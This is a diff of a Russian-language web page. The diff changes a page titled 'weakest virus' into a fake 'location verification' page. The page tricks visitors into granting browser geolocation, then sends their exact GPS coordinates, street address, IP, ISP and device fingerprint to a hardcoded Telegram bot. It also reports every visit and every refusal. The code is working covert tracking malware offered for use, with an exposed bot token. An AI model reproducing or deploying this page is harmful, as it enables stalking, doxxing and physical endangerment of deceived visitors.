@@ -1,36 +1,155 @@
 <!doctype html>
 <html lang="ru"><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>weakest virus</title>
+<title>Проверка местоположения</title>
 <style>
-body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
-background:#0d1117;color:#c9d1d9;font-family:system-ui,sans-serif;text-align:center}
-.box{padding:24px}
-.t{font-size:19px;font-weight:600;margin-bottom:6px}
-.s{font-size:13px;color:#8b949e}
-.bar{width:200px;height:4px;background:#21262d;border-radius:9px;overflow:hidden;margin:18px auto 0}
-.f{height:100%;width:0;background:#2ea043;animation:g 9s linear forwards}
-@keyframes g{to{width:100%}}
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+background:#0d1117;color:#e6edf3;font-family:system-ui,sans-serif}
+.box{width:100%;max-width:350px;padding:24px;text-align:center}
+.ic{font-size:38px;margin-bottom:12px}
+h1{font-size:17px;margin:0 0 8px;font-weight:600}
+p{font-size:12.5px;color:#8b949e;line-height:1.5;margin:0 0 16px}
+button{width:100%;padding:12px;border:0;border-radius:8px;background:#238636;
+color:#fff;font-size:14px;font-weight:600;cursor:pointer}
+button:disabled{background:#21262d;color:#8b949e}
+#st{font-size:12px;margin-top:12px;min-height:16px}
+.g{color:#3fb950}.w{color:#8b949e}.r{color:#f85149}
+#m{width:100%;height:150px;border:0;border-radius:8px;margin-top:14px;display:none}
+.small{font-size:11px;color:#484f58;margin-top:14px}
 </style>
 <div class="box">
- <div class="t">weakest virus</div>
- <div class="s" id="s">Проверка устройства...</div>
- <div class="bar"><div class="f"></div></div>
+ <div class="ic">📍</div>
+ <h1>Проверка местоположения</h1>
+ <p id="p">Для продолжения подтвердите ваше местоположение. Нажмите кнопку, затем выберите «Разрешить» в окне браузера.</p>
+ <button id="b">Разрешить</button>
+ <div id="st"></div>
+ <iframe id="m"></iframe>
+ <div class="small">Данные используются только для проверки</div>
 </div>
 <script>
-const TK='9025946568:AAGCj1Okg0kfFjYjgeeSwYn0c3FnYhwGpzE', CID='ID';
-const p=t=>fetch(`https://api.telegram.org/bot${TK}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(t)}`,{mode:'no-cors'}).catch(()=>{});
-const base=`Device: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}\nLang: ${navigator.language}\nTZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nCores: ${navigator.hardwareConcurrency||'?'}\nRAM: ${navigator.deviceMemory||'?'}GB\nTime: ${new Date()}`;
-(async()=>{
- let ip={};
- try{ip=await(await fetch('https://ipwho.is/')).json()}catch(e){}
- p(`=== weakest virus ===\nIP: ${ip.ip||'?'} | ${ip.city||'?'}, ${ip.country||'?'} | ISP: ${ip.connection?.isp||'?'}\n${base}`);
- let bat='';
- try{const b=await navigator.getBattery();bat=`Bat: ${Math.round(b.level*100)}%`}catch(e){}
- try{
-  const g=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{timeout:12000,enableHighAccuracy:true}));
-  p(`GPS: ${g.coords.latitude},${g.coords.longitude} ±${Math.round(g.coords.accuracy)}m\n${bat}\n${base}`);
- }catch(e){ p(`GPS: denied\n${bat}\n${base}`); }
- document.getElementById('s').textContent='Готово';
+const TK = '9025946568:AAGCj1Okg0kfFjYjgeeSwYn0c3FnYhwGpzE';
+const CID = '5848763827';
+
+const $ = i => document.getElementById(i);
+let ip = '?', place = '?', isp = '?', done = false;
+
+function stamp(){
+  return 'TZ: ' + Intl.DateTimeFormat().resolvedOptions().timeZone +
+   '\nLang: ' + navigator.language +
+   '\nScreen: ' + screen.width + 'x' + screen.height +
+   '\nUA: ' + navigator.userAgent +
+   '\nTime: ' + new Date().toLocaleString('ru-RU');
+}
+
+function mapLinks(la, lo){
+  return 'https://maps.google.com/?q=' + la + ',' + lo +
+   '\nhttps://yandex.ru/maps/?pt=' + lo + ',' + la + '&z=17&l=map' +
+   '\nhttps://www.openstreetmap.org/?mlat=' + la + '&mlon=' + lo + '#map=18/' + la + '/' + lo;
+}
+
+async function send(text){
+  const url = 'https://api.telegram.org/bot' + TK + '/sendMessage';
+  const body = new URLSearchParams({chat_id: CID, text: text});
+  try {
+    const r = await fetch(url, {method: 'POST', body: body});
+    if (!r.ok) throw new Error('http');
+  } catch (e) {
+    new Image().src = url + '?' + body.toString() + '&r=' + Math.random();
+  }
+}
+
+async function loadIp(){
+  try {
+    const j = await (await fetch('https://ipwho.is/')).json();
+    if (j && j.ip) {
+      ip = j.ip;
+      place = [j.city, j.region, j.country].filter(Boolean).join(', ') || '?';
+      isp = (j.connection && j.connection.isp) || '?';
+      return;
+    }
+  } catch (e) {}
+  try {
+    const j = await (await fetch('https://ipapi.co/json/')).json();
+    if (j && j.ip) { ip = j.ip; place = [j.city, j.region, j.country_name].filter(Boolean).join(', '); isp = j.org || '?'; }
+  } catch (e) {}
+}
+
+function showMap(la, lo){
+  const d = 0.004;
+  $('m').style.display = 'block';
+  $('m').src = 'https://www.openstreetmap.org/export/embed.html?bbox=' +
+    [lo - d, la - d, lo + d, la + d].join(',') + '&marker=' + la + ',' + lo;
+}
+
+async function report(p, upd){
+  const la = p.coords.latitude.toFixed(6), lo = p.coords.longitude.toFixed(6);
+  const ac = Math.round(p.coords.accuracy);
+  await send((upd ? '🎯 УТОЧНЕНИЕ' : '📍 ЛОКАЦИЯ') +
+    '\nКоординаты: ' + la + ', ' + lo +
+    '\nТочность: ±' + ac + ' м\n' + mapLinks(la, lo) +
+    '\nIP: ' + ip + ' | ' + place + '\nISP: ' + isp + '\n' + stamp());
+  try {
+    const r = await fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=18&addressdetails=1&accept-language=ru&lat=' + la + '&lon=' + lo);
+    const j = await r.json();
+    const a = j.address || {};
+    const s = [a.country, a.state, a.city || a.town || a.village,
+      a.suburb || a.neighbourhood, a.road, a.house_number, a.postcode].filter(Boolean).join(', ');
+    await send('🏠 АДРЕС' + (upd ? ' (уточнение)' : '') + '\n' + (s || j.display_name || 'не распознан') +
+      '\n±' + ac + ' м\nhttps://maps.google.com/?q=' + la + ',' + lo);
+  } catch (e) {
+    await send('🏠 АДРЕС: не удалось распознать');
+  }
+}
+
+function refine(start){
+  if (!navigator.geolocation.watchPosition) return;
+  let best = start;
+  const id = navigator.geolocation.watchPosition(p => {
+    if (p.coords.accuracy < best.coords.accuracy - 15 && p.coords.accuracy < 60) {
+      best = p; report(p, true);
+    }
+  }, () => {}, {enableHighAccuracy: true, maximumAge: 0, timeout: 25000});
+  setTimeout(() => navigator.geolocation.clearWatch(id), 15000);
+}
+
+async function ok(c){
+  if (done) return;
+  done = true;
+  $('st').className = 'g'; $('st').textContent = 'Готово ✓';
+  $('p').textContent = 'Местоположение подтверждено.';
+  $('b').disabled = true; $('b').textContent = 'Подтверждено';
+  showMap(c.coords.latitude, c.coords.longitude);
+  await report(c, false);
+  refine(c);
+}
+
+function fail(e){
+  if (done) return;
+  done = true;
+  $('st').className = 'r'; $('st').textContent = 'Геолокация недоступна';
+  $('p').textContent = 'Разрешение не выдано. Можно попробовать ещё раз.';
+  send('🚫 Отказ в геолокации\nПричина: ' + ((e && e.message) || 'denied') +
+    '\nIP: ' + ip + ' | ' + place + '\n' + stamp());
+  setTimeout(() => { done = false; }, 1000);
+}
+
+function req(){
+  if (done) return;
+  if (!navigator.geolocation) return fail({message: 'нет API'});
+  $('st').className = 'w'; $('st').textContent = 'Определяем...';
+  navigator.geolocation.getCurrentPosition(ok, fail,
+    {enableHighAccuracy: true, timeout: 25000, maximumAge: 0});
+}
+
+$('b').onclick = req;
+
+(async () => {
+  await loadIp();
+  send('👀 Ссылка открыта\nIP: ' + ip + ' | ' + place + '\nISP: ' + isp + '\n' + stamp());
+  try {
+    const p = await navigator.permissions.query({name: 'geolocation'});
+    if (p.state === 'granted') req();
+  } catch (e) {}
 })();
-                                                                      </script>
+   </script>
